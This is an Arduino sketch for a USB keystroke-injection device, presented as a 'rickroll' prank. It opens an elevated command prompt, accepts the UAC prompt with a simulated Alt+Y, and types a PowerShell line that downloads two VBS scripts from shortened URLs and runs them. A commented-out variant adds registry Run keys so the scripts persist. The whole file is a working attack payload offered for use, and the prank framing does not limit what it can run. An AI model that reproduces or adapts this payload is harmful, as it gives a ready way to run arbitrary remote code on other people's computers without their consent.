/*
 *  Author: Sam van der Kris
 *  GitLab: https://gitlab.com/WarKitteh/arduino-hid-rickroll
 */

#include "Keyboard.h"

void typeKey(int key) {
	Keyboard.press(key);
	delay(50);
	Keyboard.release(key);
}

void runPayload() {
	Keyboard.begin();
	// Give Windows some time to recognize the Arduino as a human interface device
	delay(1000);

	// Open CMD
	typeKey(KEY_LEFT_GUI);
	delay(500);
	Keyboard.print("cmd");
	delay(200);
	Keyboard.press(KEY_LEFT_CTRL);
	Keyboard.press(KEY_LEFT_SHIFT);
	Keyboard.press(KEY_RETURN);
	Keyboard.releaseAll();
	Keyboard.end();

	delay(500);

	// Bypass UAC prompt
	Keyboard.press(KEY_LEFT_ALT);
	Keyboard.press('y');
	delay(100);
	Keyboard.releaseAll();

	delay(200);

	// Download and run rickroll.vbs and exit when done
	Keyboard.print("powershell (new-object System.Net.WebClient).DownloadFile('https://goo.gl/Q0ahyr','%userprofile%\\rickroll.vbs'); && start %userprofile%\\rickroll.vbs && powershell (new-object System.Net.WebClient).DownloadFile('https://goo.gl/sT2cos','%userprofile%\\volup.vbs'); && start %userprofile%\\volup.vbs && exit");
	//Keyboard.print("powershell (new-object System.Net.WebClient).DownloadFile('https://goo.gl/Q0ahyr','%userprofile%\\rickroll.vbs'); && start %userprofile%\\rickroll.vbs && reg add HKLM\\Software\\Microsoft\\Windows\\CurrentVersion\\Run /v TotallyNotShadyStartupItem /d %userprofile%\\rickroll.vbs && powershell (new-object System.Net.WebClient).DownloadFile('https://goo.gl/sT2cos','%userprofile%\\volup.vbs'); && start %userprofile%\\volup.vbs && reg add HKLM\\Software\\Microsoft\\Windows\\CurrentVersion\\Run /v TotallyNotShadyStartupItem2 /d %userprofile%\\volup.vbs && exit");
	delay(100);
	typeKey(KEY_RETURN);

	Keyboard.end();
}

void setup() {
	// Uncomment this if you DON'T use a button on your Arduino
	//runPayload();
}

void loop() {
	// Uncomment this if you DO use a button on your Arduino (button has to be between pin 3 and ground)
	/*pinMode(3, INPUT_PULLUP);
	if (digitalRead(3) == LOW) {
		runPayload();
		delay(500);
	}*/
}
